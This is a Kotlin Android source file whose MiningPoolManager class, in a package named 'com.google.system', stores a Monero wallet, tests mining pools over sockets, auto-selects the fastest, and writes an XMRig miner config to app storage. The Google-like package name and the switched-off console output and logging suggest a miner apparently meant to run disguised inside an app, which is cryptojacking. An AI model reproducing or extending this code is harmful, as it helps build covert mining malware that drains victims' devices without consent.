package com.google.system

import android.content.Context
import org.json.JSONObject
import java.io.File
import java.net.Socket
import java.net.InetSocketAddress
import kotlinx.coroutines.*

class MiningPoolManager(
    private val context: Context,
    private val onStatusUpdate: ((String) -> Unit)? = null
) {
    companion object {
        const val PREFS_NAME = "mining_pool_config"
        const val KEY_CURRENT_POOL = "current_pool"
        const val KEY_WALLET = "wallet_address"
        const val KEY_THREADS = "thread_count"
        const val KEY_AUTO_FAILOVER = "auto_failover"
    }

    data class PoolConfig(
        val name: String,
        val host: String,
        val port: Int,
        val algo: String = "rx/0",
        val tls: Boolean = false
    )

    private val defaultPools = listOf(
        PoolConfig("Pool-0", "", 3333),
        PoolConfig("Pool-1", "", 3333),
    )

    private var activePool: PoolConfig? = null
    private var walletAddress: String = ""
    private var threadCount: Int = 2
    private var autoFailover: Boolean = true
    private var connectionJob: Job? = null
    private var isTestingConnection = false

    init {
        loadConfig()
    }

    fun loadConfig() {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        walletAddress = prefs.getString(KEY_WALLET, "") ?: ""
        threadCount = prefs.getInt(KEY_THREADS, 2)
        autoFailover = prefs.getBoolean(KEY_AUTO_FAILOVER, true)
        val poolName = prefs.getString(KEY_CURRENT_POOL, "SupportXMR") ?: "SupportXMR"
        activePool = defaultPools.find { it.name == poolName } ?: defaultPools[0]
    }

    fun saveConfig() {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
        prefs.putString(KEY_WALLET, walletAddress)
        prefs.putInt(KEY_THREADS, threadCount)
        prefs.putBoolean(KEY_AUTO_FAILOVER, autoFailover)
        prefs.putString(KEY_CURRENT_POOL, activePool?.name ?: "SupportXMR")
        prefs.apply()
    }

    fun setWallet(wallet: String): Boolean {
        if (wallet.length < 90 || wallet.length > 110) {
            return false
        }
        walletAddress = wallet
        saveConfig()
        return true
    }

    fun setPool(poolName: String): Boolean {
        val pool = defaultPools.find { it.name.equals(poolName, ignoreCase = true) }
        if (pool == null) {
            return false
        }
        activePool = pool
        saveConfig()
        onStatusUpdate?.invoke("Pool changed to: ${pool.name}")
        return true
    }

    fun setThreads(count: Int): Boolean {
        if (count < 1 || count > 8) {
            return false
        }
        threadCount = count
        saveConfig()
        return true
    }

    fun setAutoFailover(enabled: Boolean) {
        autoFailover = enabled
        saveConfig()
    }

    fun getAvailablePools(): List<PoolConfig> = defaultPools

    fun getCurrentPool(): PoolConfig? = activePool

    fun getWallet(): String = walletAddress

    fun getThreads(): Int = threadCount

    suspend fun testPoolConnection(pool: PoolConfig): PoolTestResult {
        return withContext(Dispatchers.IO) {
            isTestingConnection = true
            val startTime = System.currentTimeMillis()
            var connected = false
            var errorMsg = ""

            try {
                val socket = Socket()
                socket.connect(InetSocketAddress(pool.host, pool.port), 5000)
                connected = socket.isConnected
                socket.close()
            } catch (e: Exception) {
                errorMsg = e.message ?: "Connection failed"
            }

            val latency = System.currentTimeMillis() - startTime
            isTestingConnection = false
            PoolTestResult(pool, connected, latency, errorMsg)
        }
    }

    suspend fun testAllPools(): List<PoolTestResult> {
        val results = mutableListOf<PoolTestResult>()
        for (pool in defaultPools) {
            if (!isTestingConnection) {
                results.add(testPoolConnection(pool))
            }
        }
        return results
    }

    suspend fun autoSelectBestPool(): PoolConfig? {
        val results = testAllPools()
        val workingPools = results.filter { it.isConnected }
        if (workingPools.isEmpty()) return null

        val best = workingPools.minByOrNull { it.latency }
        if (best != null) {
            activePool = best.pool
            saveConfig()
            onStatusUpdate?.invoke("Auto-selected: ${best.pool.name} (${best.latency}ms)")
        }
        return best?.pool
    }

    fun generateConfigJson(): String {
        val pool = activePool ?: defaultPools[0]
        return """
        {
            "api": { "id": null, "worker-id": null },
            "http": { "enabled": false, "host": "127.0.0.1", "port": 0 },
            "autosave": true,
            "background": false,
            "colors": false,
            "title": false,
            "randomx": {
                "init": -1, "init-avx2": -1, "mode": "auto",
                "1gb-pages": false, "rdmsr": false, "wrmsr": false,
                "cache_qos": false, "numa": false, "no_rdmsr": true
            },
            "pools": [
                {
                    "algo": null, "coin": "monero",
                    "url": "${pool.host}:${pool.port}",
                    "user": "$walletAddress", "pass": "x",
                    "rig-id": null, "nicehash": false,
                    "keepalive": true, "enabled": true,
                    "tls": ${pool.tls}, "tls-fingerprint": null,
                    "daemon": false, "socks5": null,
                    "self-select": null, "submit-to-origin": false
                }
            ],
            "retries": 5, "retry-pause": 5,
            "syslog": false, "log-file": null,
            "print-time": 0, "health-print-time": 0, "dmi": false
        }
        """.trimIndent()
    }

    fun getConfigFile(): File {
        val configFile = File(context.filesDir, "xmrig-config.json")
        configFile.writeText(generateConfigJson())
        return configFile
    }

    data class PoolTestResult(
        val pool: PoolConfig,
        val isConnected: Boolean,
        val latency: Long,
        val error: String = ""
    )
}
